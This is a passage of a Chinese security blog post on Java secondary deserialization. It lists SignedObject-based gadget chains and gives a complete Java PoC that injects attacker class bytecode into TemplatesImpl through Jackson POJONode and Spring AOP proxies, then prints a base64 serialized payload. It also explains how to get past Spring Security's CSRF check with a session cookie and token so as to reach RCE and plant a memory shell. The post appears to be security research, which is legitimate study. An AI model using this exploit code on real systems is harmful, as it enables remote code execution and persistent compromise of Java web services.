+<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">BadAttributeValueExpException#readObject() -&gt; ToStringBean#toString() -&gt;POJONode#toString() -&gt; SignedObject#getObject() -&gt; BadAttributeValueExpException#readObject() -&gt; BaseJsonNode#toString() -&gt; TemplatesImpl#getOutputProperties()<br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h4 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap#readObject() -&gt; HashMap#putVal() -&gt; HotSwappableTargetSource#equals() -&gt; XString#equals() -&gt; ToStringBean#toString() -&gt;POJONode#toString() -&gt; SignedObject#getObject() -&gt; HashMap#readObject() -&gt; HashMap#putVal() -&gt; HotSwappableTargetSource#equals() -&gt; XString#equals() -&gt; ToStringBean#toString() -&gt;POJONode#toString()  -&gt; TemplatesImpl#getOutputProperties()<br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> MenShell.SpringMemShell;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.Repository;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><span class="hljs-keyword">import</span> org.springframework.aop.framework.AdvisedSupport;<br><span class="hljs-keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.security.*;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SignedObjectBAVEPoC</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass0</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> ctClass0.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>        ctClass0.removeMethod(writeReplace);<br>        ctClass0.toClass();<br><br><br>        <span class="hljs-type">byte</span>[] payloads = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Security-Testing\\Java-Sec\\Java-Sec-Payload\\target\\classes\\Evail_Class\\Calc_Ab.class&quot;</span>));<br>        <span class="hljs-type">Templates</span> <span class="hljs-variable">templatesImpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;payloads&#125;);<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;aaaa&quot;</span>);<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        POJONode po1= <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(makeTemplatesImplAopProxy(templatesImpl));<br>        BadAttributeValueExpException ba1= <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">1</span>);<br>        setFieldValue(ba1,<span class="hljs-string">&quot;val&quot;</span>,po1);<br><br>        <span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">keyPairGenerator</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        keyPairGenerator.initialize(<span class="hljs-number">1024</span>);<br>        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">keyPair</span> <span class="hljs-operator">=</span> keyPairGenerator.genKeyPair();<br>        <span class="hljs-type">PrivateKey</span> <span class="hljs-variable">privateKey</span> <span class="hljs-operator">=</span> keyPair.getPrivate();<br>        <span class="hljs-type">Signature</span> <span class="hljs-variable">signingEngine</span> <span class="hljs-operator">=</span> Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>( ba1, privateKey, signingEngine);<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(<span class="hljs-number">1</span>);<br>        setFieldValue(jsonNodes,<span class="hljs-string">&quot;_value&quot;</span>,signedObject);<br>        <span class="hljs-type">HotSwappableTargetSource</span> <span class="hljs-variable">hotSwappableTargetSource1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(jsonNodes);<br>        <span class="hljs-type">HotSwappableTargetSource</span> <span class="hljs-variable">hotSwappableTargetSource2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(<span class="hljs-string">&quot;1&quot;</span>));<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> makeMap(hotSwappableTargetSource1, hotSwappableTargetSource2);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(hashMap);<br>        objectOutputStream.close();<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(barr.toByteArray());<br>        System.out.println(res);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">makeTemplatesImplAopProxy</span><span class="hljs-params">(Templates templates)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">advisedSupport</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>        advisedSupport.setTarget(templates);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).getConstructor(AdvisedSupport.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(advisedSupport);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, handler);<br>        <span class="hljs-keyword">return</span> proxy;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String field, Object arg)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(field);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(obj, arg);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap&lt;Object, Object&gt; <span class="hljs-title function_">makeMap</span> <span class="hljs-params">(Object v1, Object v2 )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        HashMap&lt;Object, Object&gt; s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        setFieldValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>        Class&lt;?&gt; nodeC;<br>        <span class="hljs-keyword">try</span> &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( ClassNotFoundException e ) &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>        &#125;<br>        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>        nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br>        Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v1, v1, <span class="hljs-literal">null</span>));<br>        Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v2, v2, <span class="hljs-literal">null</span>));<br>        setFieldValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h3 id="坑点-1"><a href="#坑点-1" class="headerlink" title="坑点"></a>坑点</h3><p>这里打过去的时候发现竟然报了403，可是就算没鉴权也应该是401才对</p>
+<p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125482.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>其实这里返回403的原因实际上是<code>Spring Security</code>​默认会开启csrf验证，如果要手动关闭这个CSRF的校验需要写入以下代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">http.csrf().disable()<br></code></pre></td></tr></table></figure>
+
+<p> 那么这里默认是开启的，所以我们需要去登录的接口处拿到我们的对应的Session+CSRFtoken才可以访问该路由</p>
+<p>访问<code>/login</code>​</p>
+<p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125655.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>得到结果为</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">JSESSIONID=B2F26059AB6C4FF450F5CA7B8D1C9FDE;<br>_csrf=f25909d7-6384-4a3f-869e-9831e7f4de99<br></code></pre></td></tr></table></figure>
+
+<p>然后带着Cookie+csrf就可以RCE了，接下来就是直接打内存马的事情了</p>
+<p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125826.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Java安全 - 浅谈二次反序列化</div>
+      <div>https://zjackky.github.io/post/java-security-talking-for-secondary-desequentization-z1daqqv.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Zjacky</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年2月23日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/post/sui-ji-malaysia-raiders-1v4iqm.html" title="随记 - 马来西亚攻略">
+                        <span class="hidden-mobile">随记 - 马来西亚攻略</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'Zjackky/Zjackky.github.io');
+      s.setAttribute('issue-term', 'pathname');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://github.com/Zjackky/Zjackky.github.io" target="_blank" rel="nofollow noopener"><span>My Github</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
